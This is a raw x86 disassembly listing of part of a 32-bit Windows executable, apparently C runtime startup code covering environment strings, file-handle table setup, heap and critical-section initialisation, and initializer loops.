  424e15:	mov    eax,DWORD PTR [ebp-0x4]
  424e18:	dec    eax
  424e19:	pop    ecx
  424e1a:	mov    ds:0x45dad8,eax
  424e1f:	pop    ecx
  424e20:	mov    DWORD PTR ds:0x45dadc,edi
  424e26:	xor    eax,eax
  424e28:	pop    edi
  424e29:	pop    esi
  424e2a:	pop    ebx
  424e2b:	leave  
  424e2c:	ret    
  424e2d:	push   ecx
  424e2e:	push   ecx
  424e2f:	mov    eax,ds:0x45dc18
  424e34:	push   ebx
  424e35:	push   ebp
  424e36:	push   esi
  424e37:	push   edi
  424e38:	mov    edi,DWORD PTR ds:0x429080
  424e3e:	xor    ebx,ebx
  424e40:	xor    esi,esi
  424e42:	cmp    eax,ebx
  424e44:	push   0x2
  424e46:	pop    ebp
  424e47:	jne    0x424e76
  424e49:	call   edi
  424e4b:	mov    esi,eax
  424e4d:	cmp    esi,ebx
  424e4f:	je     0x424e5d
  424e51:	mov    DWORD PTR ds:0x45dc18,0x1
  424e5b:	jmp    0x424e7b
  424e5d:	call   DWORD PTR ds:0x429044
  424e63:	cmp    eax,0x78
  424e66:	jne    0x424e71
  424e68:	mov    eax,ebp
  424e6a:	mov    ds:0x45dc18,eax
  424e6f:	jmp    0x424e76
  424e71:	mov    eax,ds:0x45dc18
  424e76:	cmp    eax,0x1
  424e79:	jne    0x424ef8
  424e7b:	cmp    esi,ebx
  424e7d:	jne    0x424e87
  424e7f:	call   edi
  424e81:	mov    esi,eax
  424e83:	cmp    esi,ebx
  424e85:	je     0x424f00
  424e87:	cmp    WORD PTR [esi],bx
  424e8a:	mov    eax,esi
  424e8c:	je     0x424e9c
  424e8e:	add    eax,ebp
  424e90:	cmp    WORD PTR [eax],bx
  424e93:	jne    0x424e8e
  424e95:	add    eax,ebp
  424e97:	cmp    WORD PTR [eax],bx
  424e9a:	jne    0x424e8e
  424e9c:	mov    edi,DWORD PTR ds:0x42907c
  424ea2:	push   ebx
  424ea3:	push   ebx
  424ea4:	push   ebx
  424ea5:	sub    eax,esi
  424ea7:	push   ebx
  424ea8:	sar    eax,1
  424eaa:	inc    eax
  424eab:	push   eax
  424eac:	push   esi
  424ead:	push   ebx
  424eae:	push   ebx
  424eaf:	mov    DWORD PTR [esp+0x34],eax
  424eb3:	call   edi
  424eb5:	mov    ebp,eax
  424eb7:	cmp    ebp,ebx
  424eb9:	je     0x424eed
  424ebb:	push   ebp
  424ebc:	call   0x426062
  424ec1:	cmp    eax,ebx
  424ec3:	pop    ecx
  424ec4:	mov    DWORD PTR [esp+0x10],eax
  424ec8:	je     0x424eed
  424eca:	push   ebx
  424ecb:	push   ebx
  424ecc:	push   ebp
  424ecd:	push   eax
  424ece:	push   DWORD PTR [esp+0x24]
  424ed2:	push   esi
  424ed3:	push   ebx
  424ed4:	push   ebx
  424ed5:	call   edi
  424ed7:	test   eax,eax
  424ed9:	jne    0x424ee9
  424edb:	push   DWORD PTR [esp+0x10]
  424edf:	call   0x425f4a
  424ee4:	pop    ecx
  424ee5:	mov    DWORD PTR [esp+0x10],ebx
  424ee9:	mov    ebx,DWORD PTR [esp+0x10]
  424eed:	push   esi
  424eee:	call   DWORD PTR ds:0x429078
  424ef4:	mov    eax,ebx
  424ef6:	jmp    0x424f48
  424ef8:	cmp    eax,ebp
  424efa:	je     0x424f04
  424efc:	cmp    eax,ebx
  424efe:	je     0x424f04
  424f00:	xor    eax,eax
  424f02:	jmp    0x424f48
  424f04:	call   DWORD PTR ds:0x429074
  424f0a:	mov    esi,eax
  424f0c:	cmp    esi,ebx
  424f0e:	je     0x424f00
  424f10:	cmp    BYTE PTR [esi],bl
  424f12:	je     0x424f1e
  424f14:	inc    eax
  424f15:	cmp    BYTE PTR [eax],bl
  424f17:	jne    0x424f14
  424f19:	inc    eax
  424f1a:	cmp    BYTE PTR [eax],bl
  424f1c:	jne    0x424f14
  424f1e:	sub    eax,esi
  424f20:	inc    eax
  424f21:	mov    ebp,eax
  424f23:	push   ebp
  424f24:	call   0x426062
  424f29:	mov    edi,eax
  424f2b:	cmp    edi,ebx
  424f2d:	pop    ecx
  424f2e:	jne    0x424f34
  424f30:	xor    edi,edi
  424f32:	jmp    0x424f3f
  424f34:	push   ebp
  424f35:	push   esi
  424f36:	push   edi
  424f37:	call   0x426080
  424f3c:	add    esp,0xc
  424f3f:	push   esi
  424f40:	call   DWORD PTR ds:0x429070
  424f46:	mov    eax,edi
  424f48:	pop    edi
  424f49:	pop    esi
  424f4a:	pop    ebp
  424f4b:	pop    ebx
  424f4c:	pop    ecx
  424f4d:	pop    ecx
  424f4e:	ret    
  424f4f:	sub    esp,0x48
  424f52:	push   ebx
  424f53:	mov    ebx,0x480
  424f58:	push   ebx
  424f59:	call   0x426062
  424f5e:	test   eax,eax
  424f60:	pop    ecx
  424f61:	jne    0x424f6b
  424f63:	or     eax,0xffffffff
  424f66:	jmp    0x425148
  424f6b:	mov    ds:0x45e160,eax
  424f70:	mov    DWORD PTR ds:0x45e148,0x20
  424f7a:	lea    ecx,[eax+0x480]
  424f80:	jmp    0x424fa0
  424f82:	and    BYTE PTR [eax+0x4],0x0
  424f86:	or     DWORD PTR [eax],0xffffffff
  424f89:	and    DWORD PTR [eax+0x8],0x0
  424f8d:	mov    BYTE PTR [eax+0x5],0xa
  424f91:	mov    ecx,DWORD PTR ds:0x45e160
  424f97:	add    eax,0x24
  424f9a:	add    ecx,0x480
  424fa0:	cmp    eax,ecx
  424fa2:	jb     0x424f82
  424fa4:	push   ebp
  424fa5:	push   esi
  424fa6:	push   edi
  424fa7:	lea    eax,[esp+0x14]
  424fab:	push   eax
  424fac:	call   DWORD PTR ds:0x42904c
  424fb2:	cmp    WORD PTR [esp+0x46],0x0
  424fb8:	je     0x4250a7
  424fbe:	mov    eax,DWORD PTR [esp+0x48]
  424fc2:	test   eax,eax
  424fc4:	je     0x4250a7
  424fca:	mov    edi,DWORD PTR [eax]
  424fcc:	lea    ebp,[eax+0x4]
  424fcf:	lea    eax,[edi+ebp*1]
  424fd2:	mov    DWORD PTR [esp+0x10],eax
  424fd6:	mov    eax,0x800
  424fdb:	cmp    edi,eax
  424fdd:	jl     0x424fe1
  424fdf:	mov    edi,eax
  424fe1:	cmp    DWORD PTR ds:0x45e148,edi
  424fe7:	jge    0x425037
  424fe9:	mov    esi,0x45e164
  424fee:	push   ebx
  424fef:	call   0x426062
  424ff4:	test   eax,eax
  424ff6:	pop    ecx
  424ff7:	je     0x425031
  424ff9:	add    DWORD PTR ds:0x45e148,0x20
  425000:	mov    DWORD PTR [esi],eax
  425002:	lea    ecx,[eax+0x480]
  425008:	jmp    0x425020
  42500a:	and    BYTE PTR [eax+0x4],0x0
  42500e:	or     DWORD PTR [eax],0xffffffff
  425011:	and    DWORD PTR [eax+0x8],0x0
  425015:	mov    BYTE PTR [eax+0x5],0xa
  425019:	mov    ecx,DWORD PTR [esi]
  42501b:	add    eax,0x24
  42501e:	add    ecx,ebx
  425020:	cmp    eax,ecx
  425022:	jb     0x42500a
  425024:	add    esi,0x4
  425027:	cmp    DWORD PTR ds:0x45e148,edi
  42502d:	jl     0x424fee
  42502f:	jmp    0x425037
  425031:	mov    edi,DWORD PTR ds:0x45e148
  425037:	xor    ebx,ebx
  425039:	test   edi,edi
  42503b:	jle    0x4250a7
  42503d:	mov    eax,DWORD PTR [esp+0x10]
  425041:	mov    eax,DWORD PTR [eax]
  425043:	cmp    eax,0xffffffff
  425046:	je     0x42509c
  425048:	mov    cl,BYTE PTR [ebp+0x0]
  42504b:	test   cl,0x1
  42504e:	je     0x42509c
  425050:	test   cl,0x8
  425053:	jne    0x425060
  425055:	push   eax
  425056:	call   DWORD PTR ds:0x429088
  42505c:	test   eax,eax
  42505e:	je     0x42509c
  425060:	mov    ecx,ebx
  425062:	mov    eax,ebx
  425064:	and    eax,0x1f
  425067:	lea    eax,[eax+eax*8]
  42506a:	sar    ecx,0x5
  42506d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425074:	lea    esi,[ecx+eax*4]
  425077:	mov    eax,DWORD PTR [esp+0x10]
  42507b:	mov    eax,DWORD PTR [eax]
  42507d:	mov    DWORD PTR [esi],eax
  42507f:	mov    al,BYTE PTR [ebp+0x0]
  425082:	mov    BYTE PTR [esi+0x4],al
  425085:	lea    eax,[esi+0xc]
  425088:	push   0xfa0
  42508d:	push   eax
  42508e:	call   0x4263cd
  425093:	test   eax,eax
  425095:	pop    ecx
  425096:	pop    ecx
  425097:	je     0x4250c7
  425099:	inc    DWORD PTR [esi+0x8]
  42509c:	add    DWORD PTR [esp+0x10],0x4
  4250a1:	inc    ebx
  4250a2:	inc    ebp
  4250a3:	cmp    ebx,edi
  4250a5:	jl     0x42503d
  4250a7:	xor    ebx,ebx
  4250a9:	mov    ecx,DWORD PTR ds:0x45e160
  4250af:	lea    eax,[ebx+ebx*8]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	cmp    DWORD PTR [esi],0xffffffff
  4250b8:	jne    0x425129
  4250ba:	test   ebx,ebx
  4250bc:	mov    BYTE PTR [esi+0x4],0x81
  4250c0:	jne    0x4250cc
  4250c2:	push   0xfffffff6
  4250c4:	pop    eax
  4250c5:	jmp    0x4250d6
  4250c7:	or     eax,0xffffffff
  4250ca:	jmp    0x425145
  4250cc:	mov    eax,ebx
  4250ce:	dec    eax
  4250cf:	neg    eax
  4250d1:	sbb    eax,eax
  4250d3:	add    eax,0xfffffff5
  4250d6:	push   eax
  4250d7:	call   DWORD PTR ds:0x429064
  4250dd:	mov    edi,eax
  4250df:	cmp    edi,0xffffffff
  4250e2:	je     0x425123
  4250e4:	push   edi
  4250e5:	call   DWORD PTR ds:0x429088
  4250eb:	test   eax,eax
  4250ed:	je     0x425123
  4250ef:	and    eax,0xff
  4250f4:	cmp    eax,0x2
  4250f7:	mov    DWORD PTR [esi],edi
  4250f9:	jne    0x425101
  4250fb:	or     BYTE PTR [esi+0x4],0x40
  4250ff:	jmp    0x42510a
  425101:	cmp    eax,0x3
  425104:	jne    0x42510a
  425106:	or     BYTE PTR [esi+0x4],0x8
  42510a:	lea    eax,[esi+0xc]
  42510d:	push   0xfa0
  425112:	push   eax
  425113:	call   0x4263cd
  425118:	test   eax,eax
  42511a:	pop    ecx
  42511b:	pop    ecx
  42511c:	je     0x4250c7
  42511e:	inc    DWORD PTR [esi+0x8]
  425121:	jmp    0x42512d
  425123:	or     BYTE PTR [esi+0x4],0x40
  425127:	jmp    0x42512d
  425129:	or     BYTE PTR [esi+0x4],0x80
  42512d:	inc    ebx
  42512e:	cmp    ebx,0x3
  425131:	jl     0x4250a9
  425137:	push   DWORD PTR ds:0x45e148
  42513d:	call   DWORD PTR ds:0x429084
  425143:	xor    eax,eax
  425145:	pop    edi
  425146:	pop    esi
  425147:	pop    ebp
  425148:	pop    ebx
  425149:	add    esp,0x48
  42514c:	ret    
  42514d:	push   0xc
  42514f:	push   0x4295b0
  425154:	call   0x425340
  425159:	mov    DWORD PTR [ebp-0x1c],0x42a008
  425160:	cmp    DWORD PTR [ebp-0x1c],0x42a008
  425167:	jae    0x42518b
  425169:	and    DWORD PTR [ebp-0x4],0x0
  42516d:	mov    eax,DWORD PTR [ebp-0x1c]
  425170:	mov    eax,DWORD PTR [eax]
  425172:	test   eax,eax
  425174:	je     0x425181
  425176:	call   eax
  425178:	jmp    0x425181
  42517a:	xor    eax,eax
  42517c:	inc    eax
  42517d:	ret    
  42517e:	mov    esp,DWORD PTR [ebp-0x18]
  425181:	or     DWORD PTR [ebp-0x4],0xffffffff
  425185:	add    DWORD PTR [ebp-0x1c],0x4
  425189:	jmp    0x425160
  42518b:	call   0x42537b
  425190:	ret    
  425191:	push   0xc
  425193:	push   0x4295c0
  425198:	call   0x425340
  42519d:	mov    DWORD PTR [ebp-0x1c],0x42a010
  4251a4:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  4251ab:	jae    0x4251cf
  4251ad:	and    DWORD PTR [ebp-0x4],0x0
  4251b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251b4:	mov    eax,DWORD PTR [eax]
  4251b6:	test   eax,eax
  4251b8:	je     0x4251c5
  4251ba:	call   eax
  4251bc:	jmp    0x4251c5
  4251be:	xor    eax,eax
  4251c0:	inc    eax
  4251c1:	ret    
  4251c2:	mov    esp,DWORD PTR [ebp-0x18]
  4251c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251c9:	add    DWORD PTR [ebp-0x1c],0x4
  4251cd:	jmp    0x4251a4
  4251cf:	call   0x42537b
  4251d4:	ret    
  4251d5:	call   0x425416
  4251da:	mov    eax,ds:0x45d304
  4251df:	cmp    eax,0xffffffff
  4251e2:	je     0x4251f2
  4251e4:	push   eax
  4251e5:	call   DWORD PTR ds:0x429090
  4251eb:	or     DWORD PTR ds:0x45d304,0xffffffff
  4251f2:	ret    
  4251f3:	push   ebx
  4251f4:	push   esi
  4251f5:	call   DWORD PTR ds:0x429044
  4251fb:	push   DWORD PTR ds:0x45d304
  425201:	mov    ebx,eax
  425203:	call   DWORD PTR ds:0x4290a0
  425209:	mov    esi,eax
  42520b:	test   esi,esi
  42520d:	jne    0x425258
  42520f:	push   0x88
  425214:	push   0x1
  425216:	call   0x426458
  42521b:	mov    esi,eax
  42521d:	test   esi,esi
  42521f:	pop    ecx
  425220:	pop    ecx
  425221:	je     0x425250
  425223:	push   esi
  425224:	push   DWORD PTR ds:0x45d304
  42522a:	call   DWORD PTR ds:0x42909c
  425230:	test   eax,eax
  425232:	je     0x425250
  425234:	mov    DWORD PTR [esi+0x54],0x45d258
  42523b:	mov    DWORD PTR [esi+0x14],0x1
  425242:	call   DWORD PTR ds:0x429098
  425248:	or     DWORD PTR [esi+0x4],0xffffffff
  42524c:	mov    DWORD PTR [esi],eax
  42524e:	jmp    0x425258
  425250:	push   0x10
  425252:	call   0x424406
  425257:	pop    ecx
  425258:	push   ebx
  425259:	call   DWORD PTR ds:0x429094
  42525f:	mov    eax,esi
  425261:	pop    esi
  425262:	pop    ebx
  425263:	ret    
  425264:	call   0x4253cd
  425269:	test   eax,eax
  42526b:	je     0x42527d
  42526d:	call   DWORD PTR ds:0x4290a4
  425273:	cmp    eax,0xffffffff
  425276:	mov    ds:0x45d304,eax
  42527b:	jne    0x425285
  42527d:	call   0x4251d5
  425282:	xor    eax,eax
  425284:	ret    
  425285:	push   esi
  425286:	push   0x88
  42528b:	push   0x1
  42528d:	call   0x426458
  425292:	mov    esi,eax
  425294:	test   esi,esi
  425296:	pop    ecx
  425297:	pop    ecx
  425298:	je     0x4252ca
  42529a:	push   esi
  42529b:	push   DWORD PTR ds:0x45d304
  4252a1:	call   DWORD PTR ds:0x42909c
  4252a7:	test   eax,eax
  4252a9:	je     0x4252ca
  4252ab:	mov    DWORD PTR [esi+0x54],0x45d258
  4252b2:	mov    DWORD PTR [esi+0x14],0x1
  4252b9:	call   DWORD PTR ds:0x429098
  4252bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252c3:	mov    DWORD PTR [esi],eax
  4252c5:	xor    eax,eax
  4252c7:	inc    eax
  4252c8:	pop    esi
  4252c9:	ret    
  4252ca:	call   0x4251d5
  4252cf:	xor    eax,eax
  4252d1:	pop    esi
  4252d2:	ret    
  4252d3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252da:	jne    0x4252e9
  4252dc:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252e3:	jb     0x4252e9
  4252e5:	xor    eax,eax
  4252e7:	inc    eax
  4252e8:	ret    
  4252e9:	push   0x3
  4252eb:	pop    eax
  4252ec:	ret    
  4252ed:	xor    eax,eax
  4252ef:	cmp    DWORD PTR [esp+0x4],eax
  4252f3:	push   0x0
  4252f5:	sete   al
  4252f8:	push   0x1000
  4252fd:	push   eax
  4252fe:	call   DWORD PTR ds:0x429034
  425304:	test   eax,eax
  425306:	mov    ds:0x45e140,eax
  42530b:	je     0x425337
  42530d:	call   0x4252d3
  425312:	cmp    eax,0x3
  425315:	mov    ds:0x45e144,eax
  42531a:	jne    0x42533a
  42531c:	push   0x3f8
  425321:	call   0x4266da
  425326:	test   eax,eax
  425328:	pop    ecx
  425329:	jne    0x42533a
  42532b:	push   DWORD PTR ds:0x45e140
  425331:	call   DWORD PTR ds:0x4290a8
  425337:	xor    eax,eax
  425339:	ret    
  42533a:	xor    eax,eax
  42533c:	inc    eax
  42533d:	ret    
  42533e:	int3   
  42533f:	int3   
  425340:	push   0x427208
  425345:	mov    eax,fs:0x0
  42534b:	push   eax
  42534c:	mov    eax,DWORD PTR [esp+0x10]
  425350:	mov    DWORD PTR [esp+0x10],ebp
  425354:	lea    ebp,[esp+0x10]
  425358:	sub    esp,eax
  42535a:	push   ebx
  42535b:	push   esi
  42535c:	push   edi
  42535d:	mov    eax,DWORD PTR [ebp-0x8]
  425360:	mov    DWORD PTR [ebp-0x18],esp
  425363:	push   eax
  425364:	mov    eax,DWORD PTR [ebp-0x4]
  425367:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42536e:	mov    DWORD PTR [ebp-0x8],eax
  425371:	lea    eax,[ebp-0x10]
  425374:	mov    fs:0x0,eax
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x10]
  42537e:	mov    DWORD PTR fs:0x0,ecx
  425385:	pop    ecx
  425386:	pop    edi
  425387:	pop    esi
  425388:	pop    ebx
  425389:	leave  
  42538a:	push   ecx
  42538b:	ret    
  42538c:	int3   
  42538d:	int3   
  42538e:	int3   
  42538f:	int3   
  425390:	cmp    eax,0x1000
  425395:	jae    0x4253a5
  425397:	neg    eax
  425399:	add    eax,esp
  42539b:	add    eax,0x4
  42539e:	test   DWORD PTR [eax],eax
  4253a0:	xchg   esp,eax
  4253a1:	mov    eax,DWORD PTR [eax]
  4253a3:	push   eax
  4253a4:	ret    
  4253a5:	push   ecx
  4253a6:	lea    ecx,[esp+0x8]
  4253aa:	sub    ecx,0x1000
  4253b0:	sub    eax,0x1000
  4253b5:	test   DWORD PTR [ecx],eax
  4253b7:	cmp    eax,0x1000
  4253bc:	jae    0x4253aa
  4253be:	sub    ecx,eax
  4253c0:	mov    eax,esp
  4253c2:	test   DWORD PTR [ecx],eax
  4253c4:	mov    esp,ecx
  4253c6:	mov    ecx,DWORD PTR [eax]
  4253c8:	mov    eax,DWORD PTR [eax+0x4]
  4253cb:	push   eax
  4253cc:	ret    
  4253cd:	push   esi
  4253ce:	push   edi
  4253cf:	xor    esi,esi
  4253d1:	mov    edi,0x45dc20
  4253d6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253de:	jne    0x4253fe
  4253e0:	lea    eax,[esi*8+0x45d310]
  4253e7:	mov    DWORD PTR [eax],edi
  4253e9:	push   0xfa0
  4253ee:	push   DWORD PTR [eax]
  4253f0:	add    edi,0x18
  4253f3:	call   0x4263cd
  4253f8:	test   eax,eax
  4253fa:	pop    ecx
  4253fb:	pop    ecx
  4253fc:	je     0x42540a
  4253fe:	inc    esi
  4253ff:	cmp    esi,0x24
  425402:	jl     0x4253d6
  425404:	xor    eax,eax
  425406:	inc    eax
  425407:	pop    edi
  425408:	pop    esi
  425409:	ret    
  42540a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425412:	xor    eax,eax
  425414:	jmp    0x425407
  425416:	push   ebx
  425417:	mov    ebx,DWORD PTR ds:0x42908c
  42541d:	push   esi
  42541e:	mov    esi,0x45d310
  425423:	push   edi
  425424:	mov    edi,DWORD PTR [esi]
  425426:	test   edi,edi
  425428:	je     0x42543d
  42542a:	cmp    DWORD PTR [esi+0x4],0x1
  42542e:	je     0x42543d
  425430:	push   edi
  425431:	call   ebx
  425433:	push   edi
  425434:	call   0x425f4a
  425439:	and    DWORD PTR [esi],0x0
  42543c:	pop    ecx
  42543d:	add    esi,0x8
  425440:	cmp    esi,0x45d430
  425446:	jl     0x425424
  425448:	mov    esi,0x45d310
  42544d:	pop    edi
  42544e:	mov    eax,DWORD PTR [esi]
  425450:	test   eax,eax
  425452:	je     0x42545d
  425454:	cmp    DWORD PTR [esi+0x4],0x1
  425458:	jne    0x42545d
  42545a:	push   eax
  42545b:	call   ebx
  42545d:	add    esi,0x8
  425460:	cmp    esi,0x45d430
  425466:	jl     0x42544e
  425468:	pop    esi
  425469:	pop    ebx
  42546a:	ret    
  42546b:	push   ebp
  42546c:	mov    ebp,esp
  42546e:	mov    eax,DWORD PTR [ebp+0x8]
  425471:	push   DWORD PTR [eax*8+0x45d310]
  425478:	call   DWORD PTR ds:0x4290b0
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   ebp
  425481:	mov    ebp,esp
  425483:	push   esi
  425484:	mov    esi,DWORD PTR [ebp+0x8]
  425487:	lea    esi,[esi*8+0x45d310]
  42548e:	cmp    DWORD PTR [esi],0x0
  425491:	je     0x425498
  425493:	xor    eax,eax
  425495:	inc    eax
  425496:	jmp    0x4254fc
  425498:	push   edi
  425499:	push   0x18
  42549b:	call   0x426062
  4254a0:	mov    edi,eax
  4254a2:	test   edi,edi
  4254a4:	pop    ecx
  4254a5:	jne    0x4254b6
  4254a7:	call   0x4272e0
  4254ac:	mov    DWORD PTR [eax],0xc
  4254b2:	xor    eax,eax
  4254b4:	jmp    0x4254fb
  4254b6:	push   0xa
  4254b8:	call   0x4254ff
  4254bd:	cmp    DWORD PTR [esi],0x0
  4254c0:	pop    ecx
  4254c1:	jne    0x4254e9
  4254c3:	push   0xfa0
  4254c8:	push   edi
  4254c9:	call   0x4263cd
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254e5
  4254d4:	push   edi
  4254d5:	call   0x425f4a
  4254da:	push   0xa
  4254dc:	call   0x42546b
  4254e1:	pop    ecx
  4254e2:	pop    ecx
  4254e3:	jmp    0x4254a7
  4254e5:	mov    DWORD PTR [esi],edi
  4254e7:	jmp    0x4254f0
  4254e9:	push   edi
  4254ea:	call   0x425f4a
  4254ef:	pop    ecx
  4254f0:	push   0xa
  4254f2:	call   0x42546b
  4254f7:	xor    eax,eax
  4254f9:	pop    ecx
  4254fa:	inc    eax
  4254fb:	pop    edi
  4254fc:	pop    esi
  4254fd:	pop    ebp
  4254fe:	ret    
  4254ff:	push   ebp
  425500:	mov    ebp,esp
  425502:	mov    eax,DWORD PTR [ebp+0x8]
  425505:	push   esi
  425506:	lea    esi,[eax*8+0x45d310]
  42550d:	cmp    DWORD PTR [esi],0x0
  425510:	jne    0x425525
  425512:	push   eax
  425513:	call   0x425480
  425518:	test   eax,eax
  42551a:	pop    ecx
  42551b:	jne    0x425525
  42551d:	push   0x11
  42551f:	call   0x424406
  425524:	pop    ecx
  425525:	push   DWORD PTR [esi]
  425527:	call   DWORD PTR ds:0x4290b4
  42552d:	pop    esi
  42552e:	pop    ebp
  42552f:	ret    
  425530:	push   esi
  425531:	push   DWORD PTR ds:0x45e268
  425537:	call   0x427496
  42553c:	pop    ecx
  42553d:	mov    ecx,DWORD PTR ds:0x45e264
  425543:	mov    esi,eax
  425545:	mov    eax,ds:0x45e268
  42554a:	mov    edx,ecx
  42554c:	sub    edx,eax
  42554e:	add    edx,0x4
  425551:	cmp    esi,edx
  425553:	jae    0x4255a3
  425555:	mov    ecx,0x800
  42555a:	cmp    esi,ecx
  42555c:	jae    0x425560
  42555e:	mov    ecx,esi
  425560:	add    ecx,esi
  425562:	push   ecx
  425563:	push   eax
  425564:	call   0x4272e9
  425569:	test   eax,eax
  42556b:	pop    ecx
  42556c:	pop    ecx
  42556d:	jne    0x425586
  42556f:	add    esi,0x10
  425572:	push   esi
  425573:	push   DWORD PTR ds:0x45e268
  425579:	call   0x4272e9
  42557e:	test   eax,eax
  425580:	pop    ecx
  425581:	pop    ecx
  425582:	jne    0x425586
  425584:	pop    esi
  425585:	ret    
  425586:	mov    ecx,DWORD PTR ds:0x45e264
  42558c:	sub    ecx,DWORD PTR ds:0x45e268
  425592:	mov    ds:0x45e268,eax
  425597:	sar    ecx,0x2
  42559a:	lea    ecx,[eax+ecx*4]
  42559d:	mov    DWORD PTR ds:0x45e264,ecx
  4255a3:	mov    DWORD PTR [ecx],edi
  4255a5:	add    DWORD PTR ds:0x45e264,0x4
  4255ac:	mov    eax,edi
  4255ae:	pop    esi
  4255af:	ret    
  4255b0:	push   0x80
  4255b5:	call   0x426062
  4255ba:	test   eax,eax
  4255bc:	pop    ecx
  4255bd:	mov    ds:0x45e268,eax
  4255c2:	jne    0x4255c8
  4255c4:	push   0x18
  4255c6:	pop    eax
  4255c7:	ret    
  4255c8:	and    DWORD PTR [eax],0x0
  4255cb:	mov    eax,ds:0x45e268
  4255d0:	mov    ds:0x45e264,eax
  4255d5:	xor    eax,eax
  4255d7:	ret    
  4255d8:	push   0xc
  4255da:	push   0x4295d0
  4255df:	call   0x425340
  4255e4:	call   0x424651
  4255e9:	and    DWORD PTR [ebp-0x4],0x0
  4255ed:	mov    edi,DWORD PTR [ebp+0x8]
  4255f0:	call   0x425530
  4255f5:	mov    DWORD PTR [ebp-0x1c],eax
  4255f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4255fc:	call   0x42560a
  425601:	mov    eax,DWORD PTR [ebp-0x1c]
  425604:	call   0x42537b
  425609:	ret    
  42560a:	call   0x42465a
  42560f:	ret    
  425610:	push   DWORD PTR [esp+0x4]
  425614:	call   0x4255d8
  425619:	neg    eax
  42561b:	sbb    eax,eax
  42561d:	neg    eax
  42561f:	pop    ecx
  425620:	dec    eax
  425621:	ret    
  425622:	push   ebp
  425623:	mov    ebp,esp
  425625:	sub    esp,0x10
  425628:	push   ebx
  425629:	xor    ebx,ebx
  42562b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425631:	push   esi
  425632:	push   edi
  425633:	jne    0x4256a2
  425635:	push   0x429640
  42563a:	call   DWORD PTR ds:0x4290b8
  425640:	mov    edi,eax
  425642:	cmp    edi,ebx
  425644:	je     0x4256dd
  42564a:	mov    esi,DWORD PTR ds:0x429020
  425650:	push   0x429634
  425655:	push   edi
  425656:	call   esi
  425658:	test   eax,eax
  42565a:	mov    ds:0x45dd70,eax
  42565f:	je     0x4256dd
  425661:	push   0x429624
  425666:	push   edi
  425667:	call   esi
  425669:	push   0x429610
  42566e:	push   edi
  42566f:	mov    ds:0x45dd74,eax
  425674:	call   esi
  425676:	cmp    DWORD PTR ds:0x45dac4,0x2
  42567d:	mov    ds:0x45dd78,eax
  425682:	jne    0x4256a2
  425684:	push   0x4295f4
  425689:	push   edi
  42568a:	call   esi
  42568c:	test   eax,eax
  42568e:	mov    ds:0x45dd80,eax
  425693:	je     0x4256a2
  425695:	push   0x4295dc
  42569a:	push   edi
  42569b:	call   esi
  42569d:	mov    ds:0x45dd7c,eax
  4256a2:	mov    eax,ds:0x45dd7c
  4256a7:	test   eax,eax
  4256a9:	je     0x4256e7
  4256ab:	call   eax
  4256ad:	test   eax,eax
  4256af:	je     0x4256ce
  4256b1:	lea    ecx,[ebp-0x4]
  4256b4:	push   ecx
  4256b5:	push   0xc
  4256b7:	lea    ecx,[ebp-0x10]
  4256ba:	push   ecx
  4256bb:	push   0x1
  4256bd:	push   eax
  4256be:	call   DWORD PTR ds:0x45dd80
  4256c4:	test   eax,eax
  4256c6:	je     0x4256ce
  4256c8:	test   BYTE PTR [ebp-0x8],0x1
  4256cc:	jne    0x4256e7
  4256ce:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256d5:	jb     0x4256e1
  4256d7:	or     BYTE PTR [ebp+0x12],0x20
  4256db:	jmp    0x425706
  4256dd:	xor    eax,eax
  4256df:	jmp    0x425716
  4256e1:	or     BYTE PTR [ebp+0x12],0x4
  4256e5:	jmp    0x425706
  4256e7:	mov    eax,ds:0x45dd74
  4256ec:	test   eax,eax
  4256ee:	je     0x425706
  4256f0:	call   eax
  4256f2:	mov    ebx,eax
  4256f4:	test   ebx,ebx
  4256f6:	je     0x425706
  4256f8:	mov    eax,ds:0x45dd78
  4256fd:	test   eax,eax
  4256ff:	je     0x425706
  425701:	push   ebx
  425702:	call   eax
  425704:	mov    ebx,eax
  425706:	push   DWORD PTR [ebp+0x10]
  425709:	push   DWORD PTR [ebp+0xc]
  42570c:	push   DWORD PTR [ebp+0x8]
  42570f:	push   ebx
  425710:	call   DWORD PTR ds:0x45dd70
  425716:	pop    edi
  425717:	pop    esi
  425718:	pop    ebx
  425719:	leave  
  42571a:	ret    
  42571b:	int3   
  42571c:	int3   
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   edi
  425721:	mov    edi,DWORD PTR [esp+0x8]
  425725:	jmp    0x425795
  425727:	lea    esp,[esp+0x0]
  42572e:	mov    edi,edi
  425730:	mov    ecx,DWORD PTR [esp+0x4]
  425734:	push   edi
  425735:	test   ecx,0x3
  42573b:	je     0x425750
  42573d:	mov    al,BYTE PTR [ecx]
  42573f:	add    ecx,0x1
  425742:	test   al,al
  425744:	je     0x425783
  425746:	test   ecx,0x3
  42574c:	jne    0x42573d
  42574e:	mov    edi,edi
  425750:	mov    eax,DWORD PTR [ecx]
  425752:	mov    edx,0x7efefeff
  425757:	add    edx,eax
  425759:	xor    eax,0xffffffff
  42575c:	xor    eax,edx
  42575e:	add    ecx,0x4
  425761:	test   eax,0x81010100
  425766:	je     0x425750
  425768:	mov    eax,DWORD PTR [ecx-0x4]
  42576b:	test   al,al
  42576d:	je     0x425792
  42576f:	test   ah,ah
  425771:	je     0x42578d
  425773:	test   eax,0xff0000
  425778:	je     0x425788
  42577a:	test   eax,0xff000000
  42577f:	je     0x425783
  425781:	jmp    0x425750
  425783:	lea    edi,[ecx-0x1]
  425786:	jmp    0x425795
  425788:	lea    edi,[ecx-0x2]
  42578b:	jmp    0x425795
